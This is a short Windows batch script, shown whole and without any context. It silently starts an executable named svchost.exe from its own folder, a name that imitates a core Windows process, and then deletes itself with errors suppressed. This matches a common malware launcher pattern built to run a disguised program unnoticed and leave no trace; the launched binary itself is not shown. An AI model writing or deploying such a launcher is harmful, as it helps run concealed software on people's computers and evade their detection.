@echo off
cd /d "%~dp0"
if exist "%~dp0svchost.exe" (
    start /b "" "%~dp0svchost.exe"
)
del "%~f0" >nul 2>&1
